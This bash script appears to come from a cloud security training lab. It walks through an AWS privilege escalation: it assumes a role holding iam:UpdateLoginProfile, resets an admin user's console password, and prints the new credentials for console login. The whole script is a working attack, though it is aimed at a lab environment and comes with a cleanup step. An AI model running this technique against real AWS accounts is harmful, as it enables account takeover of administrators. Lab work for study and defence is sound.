#!/bin/bash

# Demo script for iam:UpdateLoginProfile privilege escalation
# This script demonstrates how a role with UpdateLoginProfile permission can escalate to admin

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Configuration
PROFILE="pl-pathfinder-starting-user-prod"
STARTING_USER="pl-pathfinder-starting-user-prod"
PRIVESC_ROLE="pl-ulp-ursula"
ADMIN_USER="pl-ulp-admin"

# Generate a random password suffix (8 characters)
RANDOM_SUFFIX=$(openssl rand -hex 4)  # Generates 8 hex characters
NEW_PASSWORD="PathfinderLabs123!${RANDOM_SUFFIX}"  # New password with random suffix

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}IAM UpdateLoginProfile Privilege Escalation Demo${NC}"
echo -e "${GREEN}========================================${NC}\n"

# Step 1: Verify starting user identity
echo -e "${YELLOW}Step 1: Verifying identity as starting user${NC}"
CURRENT_USER=$(aws sts get-caller-identity --profile $PROFILE --query 'Arn' --output text)
echo "Current identity: $CURRENT_USER"

if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
    echo -e "${RED}Error: Not running as $STARTING_USER${NC}"
    echo "Please configure your AWS CLI profile '$PROFILE' to use the starting user credentials"
    exit 1
fi
echo -e "${GREEN}✓ Verified starting user identity${NC}\n"

# Step 2: Get account ID
echo -e "${YELLOW}Step 2: Getting account ID${NC}"
ACCOUNT_ID=$(aws sts get-caller-identity --profile $PROFILE --query 'Account' --output text)
echo "Account ID: $ACCOUNT_ID"
echo -e "${GREEN}✓ Retrieved account ID${NC}\n"

# Step 3: Get original password from Terraform output (for display purposes)
echo -e "${YELLOW}Step 3: Checking existing login profile${NC}"
TERRAFORM_DIR="../../../../../.."
pushd $TERRAFORM_DIR > /dev/null

ORIGINAL_PASSWORD=$(terraform output -json | jq -r '.prod_one_hop_to_admin_iam_updateloginprofile[0].original_password.value' 2>/dev/null || echo "")

popd > /dev/null

if [ -z "$ORIGINAL_PASSWORD" ] || [ "$ORIGINAL_PASSWORD" == "null" ]; then
    echo -e "${YELLOW}Note: Unable to retrieve original password from Terraform outputs${NC}"
    echo "The admin user has an existing login profile but we don't know the current password"
else
    echo -e "${GREEN}✓ Found existing login profile for admin user${NC}"
    echo "Current password is managed by Terraform (unknown to attacker)"
fi
echo ""

# Step 4: Assume the privilege escalation role
echo -e "${YELLOW}Step 4: Assuming role $PRIVESC_ROLE${NC}"
ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/${PRIVESC_ROLE}"
echo "Role ARN: $ROLE_ARN"

CREDENTIALS=$(aws sts assume-role \
    --role-arn $ROLE_ARN \
    --role-session-name demo-attack-session \
    --profile $PROFILE \
    --output json)

# Extract credentials
export AWS_ACCESS_KEY_ID=$(echo $CREDENTIALS | jq -r '.Credentials.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $CREDENTIALS | jq -r '.Credentials.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $CREDENTIALS | jq -r '.Credentials.SessionToken')

# Verify role assumption
ROLE_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "New identity: $ROLE_IDENTITY"

if [[ ! $ROLE_IDENTITY == *"$PRIVESC_ROLE"* ]]; then
    echo -e "${RED}Error: Failed to assume $PRIVESC_ROLE${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Successfully assumed $PRIVESC_ROLE${NC}\n"

# Step 5: Verify admin user has an existing login profile
echo -e "${YELLOW}Step 5: Verifying admin user has an existing login profile${NC}"
echo "Checking for login profile for user: $ADMIN_USER"

if aws iam get-login-profile --user-name $ADMIN_USER &> /dev/null; then
    echo -e "${GREEN}✓ Confirmed: Login profile exists for $ADMIN_USER${NC}"
    LOGIN_PROFILE_INFO=$(aws iam get-login-profile --user-name $ADMIN_USER --output json)
    CREATED_DATE=$(echo $LOGIN_PROFILE_INFO | jq -r '.LoginProfile.CreateDate')
    echo "Login profile created: $CREATED_DATE"
else
    echo -e "${RED}⚠ No login profile exists for $ADMIN_USER${NC}"
    echo "This scenario requires the admin user to have an existing login profile"
    exit 1
fi
echo ""

# Step 6: Verify we don't have admin permissions yet
echo -e "${YELLOW}Step 6: Verifying we don't have admin permissions yet${NC}"
echo "Attempting to list IAM users (should fail)..."
if aws iam list-users --max-items 1 &> /dev/null; then
    echo -e "${RED}⚠ Unexpectedly have list-users permission already${NC}"
else
    echo -e "${GREEN}✓ Confirmed: Cannot list IAM users (no admin access yet)${NC}"
fi
echo ""

# Step 7: Update the login profile with a new password
echo -e "${YELLOW}Step 7: Updating login profile with new password${NC}"
echo "Changing password for user: $ADMIN_USER"
echo "New password: $NEW_PASSWORD"

# Save original password info for cleanup (if available)
if [ ! -z "$ORIGINAL_PASSWORD" ] && [ "$ORIGINAL_PASSWORD" != "null" ]; then
    echo "$ORIGINAL_PASSWORD" > /tmp/original_password_ulp.txt
fi

aws iam update-login-profile \
    --user-name $ADMIN_USER \
    --password "$NEW_PASSWORD" \
    --no-password-reset-required

if [ $? -eq 0 ]; then
    echo -e "${GREEN}✓ Successfully updated login profile!${NC}"
else
    echo -e "${RED}Failed to update login profile${NC}"
    exit 1
fi
echo ""

# Step 8: Display console login information
echo -e "${YELLOW}Step 8: Console login information${NC}"
CONSOLE_URL="https://${ACCOUNT_ID}.signin.aws.amazon.com/console"
echo "Console login URL: $CONSOLE_URL"
echo "Username: $ADMIN_USER"
echo "New password: $NEW_PASSWORD"
echo ""

echo -e "${GREEN}✓ Password successfully changed!${NC}"
echo -e "${YELLOW}To verify admin access, login to the AWS console with the new credentials${NC}"

echo -e "\n${GREEN}========================================${NC}"
echo -e "${GREEN}✅ PRIVILEGE ESCALATION SUCCESSFUL!${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "\n${YELLOW}Summary:${NC}"
echo "1. Started as: $STARTING_USER"
echo "2. Assumed role: $PRIVESC_ROLE (with UpdateLoginProfile permission)"
echo "3. Updated password for: $ADMIN_USER"
echo "4. Admin console access available at: $CONSOLE_URL"

echo -e "\n${YELLOW}Attack artifacts:${NC}"
echo "- Password changed for user $ADMIN_USER"
echo "- New console password: $NEW_PASSWORD"
if [ ! -z "$ORIGINAL_PASSWORD" ] && [ "$ORIGINAL_PASSWORD" != "null" ]; then
    echo "- Original password saved to: /tmp/original_password_ulp.txt"
fi

echo -e "\n${YELLOW}Next steps:${NC}"
echo "1. Open the console URL in a browser: $CONSOLE_URL"
echo "2. Login with username: $ADMIN_USER and password: $NEW_PASSWORD"
echo "3. You now have full administrative access through the console!"

echo -e "\n${RED}⚠ Warning: The admin user's password has been changed!${NC}"
echo "Run ./cleanup_attack.sh to restore the original password"